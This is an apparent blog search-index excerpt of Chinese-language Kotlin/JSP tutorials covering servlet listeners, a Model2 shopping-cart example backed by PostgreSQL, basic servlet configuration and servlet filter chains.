se.session) } } MyListener package a import javax.servlet.ServletContextEvent import javax.servlet.ServletContextListener import javax.servlet.ServletRequestEvent import javax.servlet.ServletRequestListener import javax.servlet.annotation.WebListener import javax.servlet.http.HttpSessionAttributeListener import javax.servlet.http.HttpSessionBindingEvent import javax.servlet.http.HttpSessionEvent import javax.servlet.http.HttpSessionListener @WebListener //通过注解方式配置监听器 class MyListener : ServletContextListener, ServletRequestListener, HttpSessionListener, HttpSessionAttributeListener { override fun contextInitialized(sce: ServletContextEvent) { println(\u0026#34;应用初始化：\u0026#34; + sce.servletContext) } override fun contextDestroyed(sce: ServletContextEvent) { println(\u0026#34;应用销毁：\u0026#34; + sce.servletContext) } override fun requestInitialized(sre: ServletRequestEvent) { println(\u0026#34;请求创建：\u0026#34; + sre.servletRequest) } override fun requestDestroyed(sre: ServletRequestEvent) { println(\u0026#34;请求销毁：\u0026#34; + sre.servletRequest) } override fun sessionCreated(se: HttpSessionEvent) { println(\u0026#34;会话创建：\u0026#34; + se.session) } override fun sessionDestroyed(se: HttpSessionEvent) { println(\u0026#34;会话销毁：\u0026#34; + se.session) } override fun attributeAdded(sbe: HttpSessionBindingEvent) { println(\u0026#34;会话添加属性：${sbe.name} :: ${sbe.value}\u0026#34;) } override fun attributeReplaced(sbe: HttpSessionBindingEvent) { println(\u0026#34;会话替换属性：${sbe.name} :: ${sbe.value}\u0026#34;) } override fun attributeRemoved(sbe: HttpSessionBindingEvent) { println(\u0026#34;会话移除属性：${sbe.name} :: ${sbe.value}\u0026#34;) } } web.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;web-app xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee\u0026#34; xsi:schemaLocation=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd\u0026#34; version=\u0026#34;3.1\u0026#34;\u0026gt; \u0026lt;listener\u0026gt; \u0026lt;listener-class\u0026gt;a.MyListener\u0026lt;/listener-class\u0026gt; \u0026lt;/listener\u0026gt; \u0026lt;/web-app\u0026gt; 加载顺序：监听器 \u0026gt; 过滤器 \u0026gt; Servlet 在线用户案例 JSP index.jsp ---- \u0026lt;%@ page import=\u0026#34;a.User\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.List\u0026#34; %\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;A\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;% final List\u0026lt;User\u0026gt; users = (List\u0026lt;User\u0026gt;) application.getAttribute(\u0026#34;users\u0026#34;); %\u0026gt; 当前在线用户人数：\u0026lt;%=users.size()%\u0026gt;\u0026lt;br\u0026gt; \u0026lt;% for (User user : users) { %\u0026gt; ID：\u0026lt;%=user.getId()%\u0026gt;，IP：\u0026lt;%=user.getIp()%\u0026gt;，FirstAccessTime：\u0026lt;%=user.getFirstAccessTime()%\u0026gt;\u0026lt;br\u0026gt; \u0026lt;% } %\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; MyListener package a import java.text.SimpleDateFormat import java.util.* import javax.servlet.ServletContextEvent import javax.servlet.ServletContextListener import javax.servlet.ServletRequestEvent import javax.servlet.ServletRequestListener import javax.servlet.annotation.WebListener import javax.servlet.http.HttpServletRequest import javax.servlet.http.HttpSessionEvent import javax.servlet.http.HttpSessionListener @WebListener class MyListener : ServletContextListener, HttpSessionListener, ServletRequestListener { val users = arrayListOf\u0026lt;User\u0026gt;() val sdf = SimpleDateFormat(\u0026#34;yyyy-MM-dd HH:mm:ss\u0026#34;) override fun contextInitialized(sce: ServletContextEvent) { sce.servletContext.setAttribute(\u0026#34;users\u0026#34;, users) } override fun contextDestroyed(sce: ServletContextEvent) { sce.servletContext.removeAttribute(\u0026#34;users\u0026#34;) } override fun sessionCreated(se: HttpSessionEvent) { //Do nothing } override fun sessionDestroyed(se: HttpSessionEvent) { val id = se.session.id users.removeAll { it.id == id } } override fun requestInitialized(sre: ServletRequestEvent) { val request = sre.servletRequest as HttpServletRequest val session = request.session val id = session.id if (!users.map { it.id }.contains(id)) { val ip = request.remoteAddr val time = sdf.format(Date(session.creationTime)) users.add(User(id, ip, time)) } } override fun requestDestroyed(sre: ServletRequestEvent) { //Do nothing } } User package a data class User(val id: String, val ip: String, val firstAccessTime: String) ","permalink":"https://xhstormr.github.io/blog/posts/jsp-listener/","summary":"","title":"JSP Listener"},{"content":"Updated on 2017-04-30\nMVC 模式\nMVC（Model - View - Controller）\nModel - JavaBean（数据）\nView - JSP（界面）\nController - Servlet（业务逻辑）\nsrc dao ItemDAO package dao import entity.Item import util.DBHelp object ItemDAO { @JvmStatic fun getAllItems() = mutableListOf\u0026lt;Item\u0026gt;().apply { DBHelp.connection .prepareStatement(\u0026#34;SELECT * FROM item;\u0026#34;) .executeQuery() .use { while (it.next()) { val item = Item( id = it.getInt(\u0026#34;id\u0026#34;), name = it.getString(\u0026#34;name\u0026#34;), city = it.getString(\u0026#34;city\u0026#34;), price = it.getInt(\u0026#34;price\u0026#34;), number = it.getInt(\u0026#34;number\u0026#34;), picture = it.getString(\u0026#34;picture\u0026#34;) ) this.add(item) } } } @JvmStatic fun getItemById(id: Int) = DBHelp.connection .prepareStatement(\u0026#34;SELECT * FROM item WHERE id = ?;\u0026#34;).apply { this.setInt(1, id) } .executeQuery() .use { if (it.next()) Item( id = it.getInt(\u0026#34;id\u0026#34;), name = it.getString(\u0026#34;name\u0026#34;), city = it.getString(\u0026#34;city\u0026#34;), price = it.getInt(\u0026#34;price\u0026#34;), number = it.getInt(\u0026#34;number\u0026#34;), picture = it.getString(\u0026#34;picture\u0026#34;) ) else Item( id = 0, name = \u0026#34;null\u0026#34;, city = \u0026#34;null\u0026#34;, price = 0, number = 0, picture = \u0026#34;null\u0026#34; ) } } entity Item package entity data class Item( val id: Int, val name: String, val city: String, val price: Int, val number: Int, val picture: String ) Cart package entity data class Cart(val goods: HashMap\u0026lt;Item, Int\u0026gt; = hashMapOf()) { fun add(item: Item, number: Int): Boolean { if (goods.containsKey(item)) { goods[item] = number + goods[item]!! } else { goods[item] = number } return true } fun remove(item: Item): Boolean { goods.remove(item) return true } fun getTotalPrice(): Double { var p = 0.0 goods.mapKeys { it.key.price }.forEach { t, u -\u0026gt; p += t * u } return p } } servlet MyServlet package servlet import dao.ItemDAO import entity.Cart import javax.servlet.annotation.WebServlet import javax.servlet.http.HttpServlet import javax.servlet.http.HttpServletRequest import javax.servlet.http.HttpServletResponse @WebServlet(urlPatterns = arrayOf(\u0026#34;/abc\u0026#34;)) class MyServlet : HttpServlet() { override fun doGet(request: HttpServletRequest, response: HttpServletResponse) { response.contentType = \u0026#34;text/html;charset=UTF-8\u0026#34; val action = request.getParameter(\u0026#34;action\u0026#34;) when (action) { \u0026#34;add\u0026#34; -\u0026gt; { if (addToCart(request)) { response.writer.use { it.print(\u0026#34;添加成功\u0026#34;) } } else { response.writer.use { it.print(\u0026#34;添加失败\u0026#34;) } } } \u0026#34;delete\u0026#34; -\u0026gt; { if (deleteFormCart(request)) { response.sendRedirect(\u0026#34;/cart.jsp\u0026#34;) } else { response.sendRedirect(\u0026#34;/cart.jsp\u0026#34;) } } \u0026#34;show\u0026#34; -\u0026gt; { response.sendRedirect(\u0026#34;/cart.jsp\u0026#34;) } } } private fun addToCart(request: HttpServletRequest): Boolean { val id = request.getParameter(\u0026#34;id\u0026#34;).toInt() val num = request.getParameter(\u0026#34;num\u0026#34;).toInt() val item = ItemDAO.getItemById(id) var cart = request.session.getAttribute(\u0026#34;cart\u0026#34;) val flag: Boolean if (cart != null \u0026amp;\u0026amp; cart is Cart) { flag = cart.add(item, num) } else { cart = Cart().apply { request.session.setAttribute(\u0026#34;cart\u0026#34;, this) } flag = cart.add(item, num) } return flag } private fun deleteFormCart(request: HttpServletRequest): Boolean { val id = request.getParameter(\u0026#34;id\u0026#34;).toInt() val item = ItemDAO.getItemById(id) val cart = request.session.getAttribute(\u0026#34;cart\u0026#34;) as Cart val flag = cart.remove(item) return flag } } util DBHelp package util import java.sql.Connection import java.sql.DriverManager object DBHelp { val connection: Connection by lazy { Class.forName(\u0026#34;org.postgresql.Driver\u0026#34;) DriverManager.getConnection(\u0026#34;jdbc:postgresql://127.0.0.1:5432/postgres\u0026#34;, \u0026#34;123\u0026#34;, \u0026#34;123456\u0026#34;) } } web index.jsp \u0026lt;%@ page import=\u0026#34;dao.ItemDAO\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;entity.Item\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.List\u0026#34; %\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;商品列表\u0026lt;/title\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; div { float: left; margin: 10px; } div dd { margin: 0; font-size: 10pt; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;商品列表\u0026lt;/h1\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;center\u0026gt; \u0026lt;table width=\u0026#34;700\u0026#34; cellpadding=\u0026#34;0\u0026#34; cellspacing=\u0026#34;0\u0026#34; border=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt; \u0026lt;% final List\u0026lt;Item\u0026gt; list = ItemDAO.getAllItems(); for (Item item : list) { %\u0026gt; \u0026lt;div\u0026gt; \u0026lt;dl\u0026gt; \u0026lt;dt\u0026gt; \u0026lt;a href=\u0026#34;details.jsp?id=\u0026lt;%=item.getId()%\u0026gt;\u0026#34;\u0026gt;\u0026lt;img src=\u0026#34;images/\u0026lt;%=item.getPicture()%\u0026gt;\u0026#34; width=\u0026#34;120\u0026#34; height=\u0026#34;90\u0026#34; border=\u0026#34;1\u0026#34;/\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/dt\u0026gt; \u0026lt;dd\u0026gt;\u0026lt;%=item.getName() %\u0026gt; \u0026lt;/dd\u0026gt; \u0026lt;dd\u0026gt;产地:\u0026lt;%=item.getCity()%\u0026gt;\u0026amp;nbsp;\u0026amp;nbsp;价格:￥ \u0026lt;%=item.getPrice()%\u0026gt; \u0026lt;/dd\u0026gt; \u0026lt;/dl\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;% } %\u0026gt; \u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; details.jsp \u0026lt;%@ page import=\u0026#34;dao.ItemDAO\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;entity.Item\u0026#34; %\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;商品详情\u0026lt;/title\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; div { float: left; margin: 10px; } div dd { margin: 0; font-size: 10pt; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;商品详情\u0026lt;/h1\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;% request.setCharacterEncoding(\u0026#34;UTF-8\u0026#34;); %\u0026gt; \u0026lt;% final int id = Integer.valueOf(request.getParameter(\u0026#34;id\u0026#34;)); final Item item = ItemDAO.getItemById(id); %\u0026gt; \u0026lt;center\u0026gt; \u0026lt;table width=\u0026#34;700\u0026#34; cellpadding=\u0026#34;0\u0026#34; cellspacing=\u0026#34;0\u0026#34; border=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td valign=\u0026#34;top\u0026#34;\u0026gt; \u0026lt;table\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td rowspan=\u0026#34;4\u0026#34;\u0026gt;\u0026lt;img src=\u0026#34;images/\u0026lt;%=item.getPicture()%\u0026gt;\u0026#34; width=\u0026#34;200\u0026#34; height=\u0026#34;160\u0026#34;/\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;\u0026lt;B\u0026gt;\u0026lt;%=item.getName()%\u0026gt; \u0026lt;/B\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;产地：\u0026lt;%=item.getCity()%\u0026gt; \u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;价格：\u0026lt;%=item.getPrice()%\u0026gt;￥\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;购买数量： \u0026lt;input id=\u0026#34;number\u0026#34; type=\u0026#34;number\u0026#34; min=\u0026#34;1\u0026#34; max=\u0026#34;100\u0026#34; value=\u0026#34;1\u0026#34;/\u0026gt; \u0026lt;span onclick=\u0026#34;c(0)\u0026#34;\u0026gt;-\u0026lt;/span\u0026gt; \u0026lt;span onclick=\u0026#34;c(1)\u0026#34;\u0026gt;+\u0026lt;/span\u0026gt; \u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt; \u0026lt;a onclick=\u0026#34;a()\u0026#34;\u0026gt;\u0026lt;img src=\u0026#34;images/in_cart.png\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;a onclick=\u0026#34;b()\u0026#34;\u0026gt;\u0026lt;img src=\u0026#34;images/view_cart.jpg\u0026#34;/\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/center\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;js/jquery-3.2.1.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; function a() { var id = new URLSearchParams(location.search).get(\u0026#39;id\u0026#39;); var num = parseInt(document.getElementById(\u0026#34;number\u0026#34;).value); var data = { action: \u0026#34;add\u0026#34;, id: id, num: num }; $.ajax({ url: \u0026#34;/abc\u0026#34;, type: \u0026#34;get\u0026#34;, data: data, success: function (s) { alert(s); } }); } function b() { var data = { action: \u0026#34;show\u0026#34; }; var params = decodeURIComponent($.param(data)); location.href = location.protocol + \u0026#39;//\u0026#39; + location.host + \u0026#39;/abc?\u0026#39; + params; } function c(flag) { var e = document.getElementById(\u0026#34;number\u0026#34;); var num = parseInt(e.value); if (flag === 0) { num--; } else if (flag === 1) { num++; } if (num \u0026lt; 1) { e.value = 1; } else if (num \u0026gt; 100) { e.value = 100; } else { e.value = num; } } \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; cart.jsp \u0026lt;%@ page import=\u0026#34;entity.Cart\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;entity.Item\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.HashMap\u0026#34; %\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;购物车\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;购物车\u0026lt;/h1\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;table\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;th\u0026gt;商品名称\u0026lt;/th\u0026gt; \u0026lt;th\u0026gt;商品单价\u0026lt;/th\u0026gt; \u0026lt;th\u0026gt;购买数量\u0026lt;/th\u0026gt; \u0026lt;th\u0026gt;商品价格\u0026lt;/th\u0026gt; \u0026lt;th\u0026gt;操作\u0026lt;/th\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;% final Cart cart = (Cart) request.getSession().getAttribute(\u0026#34;cart\u0026#34;); if (cart != null) { HashMap\u0026lt;Item, Integer\u0026gt; goods = cart.getGoods(); for (Item i : goods.keySet()) { final int x = i.getPrice(); final int y = goods.get(i); %\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;\u0026lt;%=i.getName()%\u0026gt; \u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;%=x%\u0026gt; \u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;%=y%\u0026gt; \u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;%=x * y%\u0026gt; \u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;a onclick=\u0026#34;a()\u0026#34; href=\u0026#34;/abc?action=delete\u0026amp;id=\u0026lt;%=i.getId()%\u0026gt;\u0026#34;\u0026gt;删除\u0026lt;/a\u0026gt; \u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;% } } %\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td colspan=\u0026#34;5\u0026#34; style=\u0026#34;background-color: lightgreen\u0026#34;\u0026gt;总计：\u0026lt;%=cart == null ? 0.0 : cart.getTotalPrice() %\u0026gt;￥ \u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;script\u0026gt; function a() { window.event.returnValue = confirm(\u0026#34;确认要删除？\u0026#34;); } \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; sql CREATE TABLE item ( id SERIAL, name TEXT NOT NULL, city TEXT NOT NULL, price INTEGER NOT NULL, number INTEGER NOT NULL, picture TEXT NOT NULL, PRIMARY KEY (id) ); INSERT INTO item (name, city, price, number, picture) VALUES (\u0026#39;沃特篮球鞋\u0026#39;, \u0026#39;佛山\u0026#39;, \u0026#39;180\u0026#39;, \u0026#39;500\u0026#39;, \u0026#39;001.jpg\u0026#39;); INSERT INTO item (name, city, price, number, picture) VALUES (\u0026#39;安踏运动鞋\u0026#39;, \u0026#39;福州\u0026#39;, \u0026#39;120\u0026#39;, \u0026#39;800\u0026#39;, \u0026#39;002.jpg\u0026#39;); INSERT INTO item (name, city, price, number, picture) VALUES (\u0026#39;耐克运动鞋\u0026#39;, \u0026#39;广州\u0026#39;, \u0026#39;500\u0026#39;, \u0026#39;1000\u0026#39;, \u0026#39;003.jpg\u0026#39;); INSERT INTO item (name, city, price, number, picture) VALUES (\u0026#39;阿迪达斯T血衫\u0026#39;, \u0026#39;上海\u0026#39;, \u0026#39;388\u0026#39;, \u0026#39;600\u0026#39;, \u0026#39;004.jpg\u0026#39;); INSERT INTO item (name, city, price, number, picture) VALUES (\u0026#39;李宁文化衫\u0026#39;, \u0026#39;广州\u0026#39;, \u0026#39;180\u0026#39;, \u0026#39;900\u0026#39;, \u0026#39;005.jpg\u0026#39;); INSERT INTO item (name, city, price, number, picture) VALUES (\u0026#39;小米3\u0026#39;, \u0026#39;北京\u0026#39;, \u0026#39;1999\u0026#39;, \u0026#39;3000\u0026#39;, \u0026#39;006.jpg\u0026#39;); INSERT INTO item (name, city, price, number, picture) VALUES (\u0026#39;小米2S\u0026#39;, \u0026#39;北京\u0026#39;, \u0026#39;1299\u0026#39;, \u0026#39;1000\u0026#39;, \u0026#39;007.jpg\u0026#39;); INSERT INTO item (name, city, price, number, picture) VALUES (\u0026#39;thinkpad笔记本\u0026#39;, \u0026#39;北京\u0026#39;, \u0026#39;6999\u0026#39;, \u0026#39;500\u0026#39;, \u0026#39;008.jpg\u0026#39;); INSERT INTO item (name, city, price, number, picture) VALUES (\u0026#39;dell笔记本\u0026#39;, \u0026#39;北京\u0026#39;, \u0026#39;3999\u0026#39;, \u0026#39;500\u0026#39;, \u0026#39;009.jpg\u0026#39;); INSERT INTO item (name, city, price, number, picture) VALUES (\u0026#39;ipad5\u0026#39;, \u0026#39;北京\u0026#39;, \u0026#39;5999\u0026#39;, \u0026#39;500\u0026#39;, \u0026#39;010.jpg\u0026#39;); ","permalink":"https://xhstormr.github.io/blog/posts/jsp-model2/","summary":"","title":"JSP Model2"},{"content":"Updated on 2017-04-11\n工作原理 MyServlet package a import javax.servlet.annotation.WebInitParam import javax.servlet.annotation.WebServlet import javax.servlet.http.HttpServlet import javax.servlet.http.HttpServletRequest import javax.servlet.http.HttpServletResponse @WebServlet(urlPatterns = arrayOf(\u0026#34;/abc\u0026#34;), initParams = arrayOf(WebInitParam(name = \u0026#34;name\u0026#34;, value = \u0026#34;Tom\u0026#34;)), loadOnStartup = 1) //通过注解方式配置 Servlet class MyServlet : HttpServlet() { 继承 HttpServlet init { println(\u0026#34;实例化\u0026#34;) } override fun init() { println(\u0026#34;初始化\u0026#34;) val s = getInitParameter(\u0026#34;name\u0026#34;) println(s) } override fun destroy() { println(\u0026#34;销毁\u0026#34;) } override fun doGet(req: HttpServletRequest, resp: HttpServletResponse) { 由 service 方法中转 println(\u0026#34;处理请求 Get\u0026#34;) resp.contentType = \u0026#34;text/html;charset=UTF-8\u0026#34; 设置内容类型 val out = resp.writer out.use { it.write(\u0026#34;\u0026lt;strong\u0026gt;ABC\u0026lt;/strong\u0026gt;\u0026lt;br\u0026gt;\u0026#34;) } } override fun doPost(req: HttpServletRequest, resp: HttpServletResponse) { 由 service 方法中转 println(\u0026#34;处理请求 Post\u0026#34;) resp.contentType = \u0026#34;text/html;charset=UTF-8\u0026#34; 设置内容类型 val out = resp.writer out.use { it.write(\u0026#34;\u0026lt;strong\u0026gt;ABC\u0026lt;/strong\u0026gt;\u0026lt;br\u0026gt;\u0026#34;) } } } 若 WebApp 的上下文不为 \u0026#34;/\u0026#34;，则使用绝对路径时需要加上 request.getContextPath() 例：\u0026lt;a href=\u0026#34;\u0026lt;%=request.getContextPath()%\u0026gt;/abc\u0026#34;\u0026gt;链接\u0026lt;/a\u0026gt; https://tomcat.apache.org/tomcat-9.0-doc/servletapi/javax/servlet/http/HttpServletRequest.html#getContextPath-- web.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;web-app xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee\u0026#34; xsi:schemaLocation=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd\u0026#34; version=\u0026#34;3.1\u0026#34;\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;s\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;a.MyServlet\u0026lt;/servlet-class\u0026gt; \u0026lt;load-on-startup\u0026gt;1\u0026lt;/load-on-startup\u0026gt; 设置启动时自动加载（数值越小越先加载） \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;name\u0026lt;/param-name\u0026gt; 初始化参数 \u0026lt;param-value\u0026gt;Tom\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;s\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/abc\u0026lt;/url-pattern\u0026gt; 匹配地址：http://localhost:8080/abc \u0026lt;/servlet-mapping\u0026gt; \u0026lt;/web-app\u0026gt; ","permalink":"https://xhstormr.github.io/blog/posts/jsp-servlet/","summary":"","title":"JSP Servlet"},{"content":"Updated on 2017-04-03\n工作原理 用于 拦截 客户端的 请求 信息和服务端的 响应 信息，并对这些信息进行 过滤。\nMyFilter1 package a import javax.servlet.* class MyFilter1 : Filter { 继承 Filter override fun init(filterConfig: FilterConfig) { 用于读取 web.xml 中过滤器的配置参数（\u0026lt;init-param\u0026gt;） println(\u0026#34;init---MyFilter1\u0026#34;) } override fun doFilter(p0: ServletRequest, p1: ServletResponse, p2: FilterChain) { 核心方法 println(\u0026#34;doFilter---MyFilter1---Start\u0026#34;) 放行前 p2.doFilter(p0, p1) 不过滤（放行）：将请求传递给下一个过滤器（若已为最后一个过滤器，则为目标资源） println(\u0026#34;doFilter---MyFilter1---End\u0026#34;) 放行后 要过滤：通过请求转发（request）、请求重定向（response），跳转至其他资源。 } override fun destroy() { 用于释放过滤器所占用的资源 println(\u0026#34;destroy---MyFilter1\u0026#34;) } } MyFilter2 package a import javax.servlet.* class MyFilter2 : Filter { override fun init(filterConfig: FilterConfig) { println(\u0026#34;init---MyFilter2\u0026#34;) } override fun doFilter(p0: ServletRequest, p1: ServletResponse, p2: FilterChain) { println(\u0026#34;doFilter---MyFilter2---Start\u0026#34;) p2.doFilter(p0, p1) println(\u0026#34;doFilter---MyFilter2---End\u0026#34;) } override fun destroy() { println(\u0026#34;destroy---MyFilter2\u0026#34;) } } index.jsp \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;% System.out.println(\u0026#34;index.jsp\u0026#34;); %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Title\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; web.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;web-app xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee\u0026#34; xsi:schemaLocation=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd\u0026#34; version=\u0026#34;3.1\u0026#34;\u0026gt; \u0026lt;filter\u0026gt; 过滤器 \u0026lt;filter-name\u0026gt;f1\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;a.MyFilter1\u0026lt;/filter-class\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;f1\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/*\u0026lt;/url-pattern\u0026gt; 匹配所有路径 \u0026lt;/filter-mapping\u0026gt; \u0026lt;filter\u0026gt; 过滤器 \u0026lt;filter-name\u0026gt;f2\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;a.MyFilter2\u0026lt;/filter-class\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;f2\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/*\u0026lt;/url-pattern\u0026gt; 匹配所有路径 \u0026lt;/filter-mapping\u0026gt; \u0026lt;/web-app\u0026gt; 过滤器链：若一个请求匹配有多个过滤器，则服务器会按照 web.xml 中定义过滤器的先后顺序将过滤器组装成一条链。 Output init---MyFilter1 init---MyFilter2 doFilter---MyFilter1---Start doFilter---MyFilter2---Start index.jsp doFilter---MyFilter2---End doFilter---MyFilter1---End destroy---MyFilter1 destroy---MyFilter2 Dispatcher REQUEST：当目标资源是通过 用户直接访问 时，将调用该过滤器。（缺省值） FORWARD：当目标资源是通过 **RequestDispatcher.forward()**访问时，将调用该过滤器。 INCLUDE：当目标资源是通过 RequestDispatcher.include() 访问时，将调用该过滤器。 ERROR：当目标资源是通过 异常处理机制 访问时，将调用该过滤器。 ASYNC：支持异步处理。 web.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;web-app xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee\u0026#34; xsi:schemaLocation=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd\u0026#34; version=\u0026#34;3.1\u0026#34;\u0026gt; \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;f1\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;a.MyFilter1\u0026lt;/filter-class\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;f1\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/error.jsp\u0026lt;/url-pattern\u0026gt; \u0026lt;dispatcher\u0026gt;ERROR\u0026lt;/dispatcher\u0026gt; [REQUEST, FORWARD, INCLUDE, ERROR, ASYNC] \u0026lt;/filter-mapping\u0026gt; ↳ 若未配置 dispatcher，则 REQUEST 为缺省值 \u0026lt;error-page\u0026gt; 